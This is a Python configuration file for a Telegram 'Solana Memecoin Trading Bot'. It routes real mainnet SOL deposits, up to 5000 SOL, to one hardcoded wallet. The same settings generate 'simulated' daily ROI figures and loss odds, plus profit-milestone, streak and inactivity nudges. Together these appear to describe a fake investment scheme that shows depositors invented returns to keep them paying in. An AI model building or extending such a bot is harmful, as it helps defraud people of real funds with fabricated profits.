"""
Configuration file for the Solana Memecoin Trading Bot
"""
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Bot Configuration
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
ADMIN_USER_ID = os.environ.get('ADMIN_USER_ID', '5488280696')  # Admin Telegram ID
ADMIN_IDS = [os.environ.get('ADMIN_USER_ID', '5488280696')]  # List of authorized admin IDs

# Database Configuration
DATABASE_URL = os.environ.get('DATABASE_URL')

# Solana Configuration
MIN_DEPOSIT = 0.5  # Minimum deposit amount in SOL
MAX_DEPOSIT = 5000  # Maximum deposit amount in SOL
SOLANA_NETWORK = "mainnet-beta"  # mainnet-beta, testnet, or devnet
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Default public RPC endpoint
GLOBAL_DEPOSIT_WALLET = "Soa8DkfSzZEmXLJ2AWEqm76fgrSWYxT5iPg6kDdZbKmx"  # Default global deposit address

# Global Settings
DEFAULT_WALLET = "Soa8DkfSzZEmXLJ2AWEqm76fgrSWYxT5iPg6kDdZbKmx"  # Default deposit wallet address
SUPPORT_USERNAME = "SolanaMemoBotAdmin"  # Default support username

# API endpoints
TELEGRAM_API_URL = "https://api.telegram.org/bot{}"  # Will be formatted with token

# ROI Configuration
SIMULATED_DAILY_ROI_MIN = 0.5  # Minimum daily ROI percentage
SIMULATED_DAILY_ROI_MAX = 2.2  # Maximum daily ROI percentage
SIMULATED_LOSS_PROBABILITY = 0.15  # Probability of a daily loss (15%)

# Notification settings
DAILY_UPDATE_HOUR = 9  # Hour of the day (0-23) to send daily updates

# User Engagement Settings
PROFIT_MILESTONES = [10, 25, 50, 75, 100]  # Profit percentage milestones to trigger notifications
STREAK_MILESTONES = [3, 5, 7, 10, 14]  # Consecutive profitable days milestones
INACTIVITY_THRESHOLD = 3  # Days of inactivity before sending a reminder